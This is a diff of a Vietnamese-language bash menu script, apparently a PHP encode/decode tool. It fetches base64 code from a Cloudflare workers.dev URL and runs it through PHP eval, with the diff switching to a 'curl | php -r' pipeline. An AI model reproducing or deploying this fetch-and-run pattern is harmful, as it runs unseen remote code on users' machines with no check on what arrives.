@@ -1,9 +1,8 @@
-#!/data/data/com.termux/files/usr/bin/bash
-
-cd "$(dirname "$0")"
+#!/usr/bin/env bash
 
 clear
 echo -e "===== [TOOL PHP SYSTEM BY AN ORIN] =====\n"
+
 echo "[1] Encode File"
 echo "[2] Decode File"
 echo "[3] Decode URL"
@@ -19,47 +18,31 @@ case $choose in
     *) echo "Sai lựa chọn"; exit ;;
 esac
 
-MODE=$mode php <<'EOF'
-<?php
+URL="https://old-rain-6157.anorintool.workers.dev/?mode=$mode"
 
-$mode = getenv("MODE");
+echo "[+] Đang tải và thực thi..."
 
-$url = "https://old-rain-6157.anorintool.workers.dev/?mode=" . $mode;
+curl -s "$URL" \
+| php -r '
+$data = json_decode(stream_get_contents(STDIN), true);
 
-$context = stream_context_create([
-    "http" => [
-        "timeout" => 10,
-        "header" => "User-Agent: AnorinClient/3.0\r\n"
-    ]
-]);
-
-$menu = @file_get_contents($url, false, $context);
-
-if (!$menu) {
-    exit("❌ Không kết nối được API\n");
+if (!$data || !isset($data["status"])) {
+    exit("❌ JSON lỗi\n");
 }
 
-$data = json_decode($menu, true);
-
-if (!$data || !isset($data['status'])) {
-    exit("❌ JSON không hợp lệ\n");
-}
-
-if ($data['status'] !== 'success') {
+if ($data["status"] !== "success") {
     exit("⚠️ API lỗi\n");
 }
 
-if (empty($data['data'])) {
+if (empty($data["data"])) {
     exit("⚠️ Không có dữ liệu\n");
 }
 
-$real = base64_decode($data['data']);
+$real = base64_decode($data["data"]);
 
 if ($real === false || trim($real) === "") {
     exit("⚠️ Decode rỗng\n");
 }
 
 eval("?>".$real);
-
-?>
-EOF
+'
